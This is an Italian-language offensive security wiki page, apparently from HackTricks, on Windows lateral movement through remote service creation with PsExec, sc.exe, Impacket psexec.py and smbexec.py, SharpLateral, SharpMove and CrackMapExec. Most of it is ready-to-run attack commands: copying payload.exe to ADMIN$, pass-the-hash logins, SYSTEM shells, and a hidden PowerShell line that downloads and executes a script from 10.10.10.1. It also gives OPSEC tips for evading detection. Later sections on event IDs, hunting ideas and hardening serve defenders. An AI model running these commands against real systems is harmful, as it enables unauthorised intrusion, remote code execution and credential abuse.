# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Come funzionano

Queste tecniche abusano del Windows Service Control Manager (SCM) da remoto tramite SMB/RPC per eseguire comandi su un host target. Il flusso comune è:

1. Autenticarsi al target e accedere alla condivisione ADMIN$ tramite SMB (TCP/445).
2. Copiare un eseguibile o specificare una riga di comando LOLBAS che il servizio eseguirà.
3. Creare un servizio da remoto tramite SCM (MS-SCMR su \PIPE\svcctl) puntando a quel comando o binario.
4. Avviare il servizio per eseguire il payload e, facoltativamente, catturare stdin/stdout tramite una named pipe.
5. Fermare il servizio e ripulire (eliminare il servizio e qualsiasi binario scaricato).

Requisiti/prerequisiti:
- Amministratore locale sul target (SeCreateServicePrivilege) o diritti espliciti di creazione del servizio sul target.
- SMB (445) raggiungibile e condivisione ADMIN$ disponibile; gestione remota dei servizi consentita attraverso il firewall dell'host.
- Restrizioni remote UAC: con account locali, il filtraggio dei token può bloccare l'amministratore sulla rete a meno che non si utilizzi l'Amministratore integrato o LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: utilizzare un hostname/FQDN abilita Kerberos; connettersi tramite IP spesso torna a NTLM (e potrebbe essere bloccato in ambienti rinforzati).

### ScExec/WinExec manuale tramite sc.exe

Quanto segue mostra un approccio minimale per la creazione di un servizio. L'immagine del servizio può essere un EXE scaricato o un LOLBAS come cmd.exe o powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Note:
- Aspettati un errore di timeout quando avvii un EXE non servizio; l'esecuzione avviene comunque.
- Per rimanere più OPSEC-friendly, preferisci comandi senza file (cmd /c, powershell -enc) o elimina gli artefatti lasciati.

Trova passi più dettagliati in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Tooling e esempi

### Sysinternals PsExec.exe

- Strumento classico per amministratori che utilizza SMB per scaricare PSEXESVC.exe in ADMIN$, installa un servizio temporaneo (nome predefinito PSEXESVC) e proxy I/O tramite named pipes.
- Esempi di utilizzo:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Puoi avviare direttamente da Sysinternals Live tramite WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Lascia eventi di installazione/disinstallazione del servizio (Il nome del servizio è spesso PSEXESVC a meno che non venga utilizzato -r) e crea C:\Windows\PSEXESVC.exe durante l'esecuzione.

### Impacket psexec.py (Simile a PsExec)

- Utilizza un servizio incorporato simile a RemCom. Rilascia un binario di servizio transitorio (nome comunemente randomizzato) tramite ADMIN$, crea un servizio (di default spesso RemComSvc) e proxy I/O tramite un pipe nominato.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- EXE temporaneo in C:\Windows\ (8 caratteri casuali). Il nome del servizio predefinito è RemComSvc a meno che non venga sovrascritto.

### Impacket smbexec.py (SMBExec)

- Crea un servizio temporaneo che avvia cmd.exe e utilizza un named pipe per I/O. In genere evita di scaricare un payload EXE completo; l'esecuzione dei comandi è semi-interattiva.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral e SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa diversi metodi di movimento laterale, incluso l'exec basato su servizio.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) include la modifica/creazione di servizi per eseguire un comando da remoto.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Puoi anche usare CrackMapExec per eseguire tramite diversi backend (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, rilevamento e artefatti

Artefatti tipici di host/rete quando si utilizzano tecniche simili a PsExec:
- Sicurezza 4624 (Tipo di accesso 3) e 4672 (Privilegi speciali) sul target per l'account admin utilizzato.
- Sicurezza 5140/5145 eventi File Share e File Share Detailed che mostrano accesso a ADMIN$ e creazione/scrittura di binari di servizio (ad es., PSEXESVC.exe o .exe casuali di 8 caratteri).
- Sicurezza 7045 Installazione del servizio sul target: nomi di servizio come PSEXESVC, RemComSvc, o personalizzati (-r / -service-name).
- Sysmon 1 (Creazione processo) per services.exe o l'immagine del servizio, 3 (Connessione di rete), 11 (Creazione file) in C:\Windows\, 17/18 (Pipe Creata/Connessa) per pipe come \\.\pipe\psexesvc, \\.\pipe\remcom_*, o equivalenti randomizzati.
- Artefatto di registro per EULA di Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 sull'host operatore (se non soppressa).

Idee di ricerca
- Allerta su installazioni di servizi dove l'ImagePath include cmd.exe /c, powershell.exe, o posizioni TEMP.
- Cerca creazioni di processi dove ParentImage è C:\Windows\PSEXESVC.exe o figli di services.exe in esecuzione come LOCAL SYSTEM che eseguono shell.
- Segnala pipe nominate che terminano con -stdin/-stdout/-stderr o nomi di pipe ben noti di clone di PsExec.

## Risoluzione dei problemi comuni
- Accesso negato (5) durante la creazione di servizi: non è un vero admin locale, restrizioni UAC remote per account locali, o protezione da manomissione EDR sul percorso del binario di servizio.
- Il percorso di rete non è stato trovato (53) o non è stato possibile connettersi a ADMIN$: firewall che blocca SMB/RPC o condivisioni admin disabilitate.
- Kerberos fallisce ma NTLM è bloccato: connettersi utilizzando hostname/FQDN (non IP), assicurarsi che SPN siano corretti, o fornire -k/-no-pass con i biglietti quando si utilizza Impacket.
- L'avvio del servizio scade ma il payload è stato eseguito: previsto se non è un vero binario di servizio; catturare l'output in un file o utilizzare smbexec per I/O dal vivo.

## Note di indurimento (cambiamenti moderni)
- Windows 11 24H2 e Windows Server 2025 richiedono la firma SMB per impostazione predefinita per le connessioni in uscita (e Windows 11 in entrata). Questo non interrompe l'uso legittimo di PsExec con credenziali valide ma previene l'abuso di relay SMB non firmati e può influenzare i dispositivi che non supportano la firma.
- Il nuovo blocco NTLM del client SMB (Windows 11 24H2/Server 2025) può impedire il fallback NTLM quando ci si connette tramite IP o a server non Kerberos. In ambienti induriti, questo interromperà PsExec/SMBExec basato su NTLM; utilizzare Kerberos (hostname/FQDN) o configurare eccezioni se necessario legittimamente.
- Principio del minimo privilegio: ridurre al minimo l'appartenenza all'amministratore locale, preferire Just-in-Time/Just-Enough Admin, applicare LAPS e monitorare/allertare sulle installazioni di servizi 7045.

## Vedi anche

- Esecuzione remota basata su WMI (spesso più senza file):
{{#ref}}
lateral-movement/wmiexec.md
{{#endref}}

- Esecuzione remota basata su WinRM:
{{#ref}}
lateral-movement/winrm.md
{{#endref}}



## Riferimenti

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Indurimento della sicurezza SMB in Windows Server 2025 & Windows 11 (firma per impostazione predefinita, blocco NTLM): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
{{#include ../../banners/hacktricks-training.md}}
